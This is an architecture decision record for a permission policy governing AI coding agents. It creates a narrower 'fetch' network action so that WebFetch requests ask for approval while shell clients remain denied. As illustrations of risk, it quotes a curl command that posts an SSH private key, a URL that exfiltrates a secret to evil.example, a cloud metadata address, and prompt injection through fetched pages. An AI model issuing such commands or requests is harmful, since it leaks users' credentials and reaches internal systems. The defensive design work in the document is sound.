# ADR-017: `fetch`, a narrower kind of `net` for a host's own fetch tool

Status: accepted · Date: 2026-10-05 · Decided by the maintainer

## Context

The default policy denies network access to unlisted hosts (`defaults: net: deny`).
Claude Code `WebFetch` was classified as a `net` action like `curl`, so reading
`https://docs.rs/serde` with it was denied, which pushed users to allow whole hosts or to
switch the default off. The two are not the same risk:

- A shell client (`curl`, `wget`, `nc`, an interpreter) can send anything: a request body
  (`curl -d @~/.ssh/id_rsa`), custom headers, a raw socket. With a secret already in the
  context or on disk, one command exfiltrates it.
- `WebFetch` is the host's own tool. It issues a GET for a URL; the agent chooses the URL
  and a prompt for the summariser, not a body or headers.

The other network-shaped host actions are not fetches: a Claude Code `Monitor` WebSocket
(`ws.url`) sends and receives frames, and an MCP tool's `url` argument can do whatever the
server does. Codex does not hook web tools, and the Cursor adapter maps no fetch tool.

## Decision

- New action kind `fetch` (`Kind::Fetch`, `Action::Fetch { url }`,
  `AtomicAction::Fetch { host }`). Adapters produce it only for a host's own read-only fetch
  tool; today that is Claude Code `WebFetch`. The host comes from the one URL parser
  (`host::of_url`); a URL without a host is `unparseable` (ask).
- A fetch is a narrower kind of `net`. For a fetch atom, each list (`deny`, `allow`, `ask`)
  matches on its `net` patterns **or** its `fetch` patterns, and the default is
  `defaults.fetch`, else `defaults.net`, else `"*"`. A `fetch` pattern never matches any
  other network atom. Deny stays absolute and the strictest verdict still wins across atoms
  (ADR-002): a `net` deny rule catches a fetch, and a `fetch` allow cannot lift it.
- The default policy adds `defaults: fetch: ask` and keeps `net: deny`. `registries` (a
  `net` allow) keeps allowing both; `local-net` keeps localhost at ask for both.
- Schema v1 stays v1: `fetch` is an optional key in rule groups and `defaults`. A policy
  without it behaves exactly as before, because a fetch then takes the `net` rules and
  default. The unreachable-rule lint treats a `net` pattern as covering a `fetch` pattern,
  never the reverse.

## Consequences

- `WebFetch` of an unlisted host asks; the same URL through `curl`, `wget`, `nc`, `Monitor`
  or an MCP argument is still denied. Audit lines show `fetch <url>` and rule
  `default.fetch`.
- Residual risk, accepted because a person approves each fetch:
  - A GET can still exfiltrate data placed in the URL path or query
    (`https://evil.example/?k=<secret>`). The prompt shows the full URL; there is no taint
    tracking yet to escalate a fetch after a secret read.
  - Fetched content can carry prompt injection into the session. `ask` does not inspect
    content; it only keeps a human in the loop on which hosts are read.
  - There is no default `net` deny list, so a fetch of a link-local or internal address
    (`http://169.254.169.254/`, `http://intranet/`) asks rather than being denied unless the
    user adds a `net` deny rule.
- Users who want the old behaviour set `defaults: fetch: deny`; users who trust a
  documentation site add it under a `fetch` allow without opening it to shell clients.
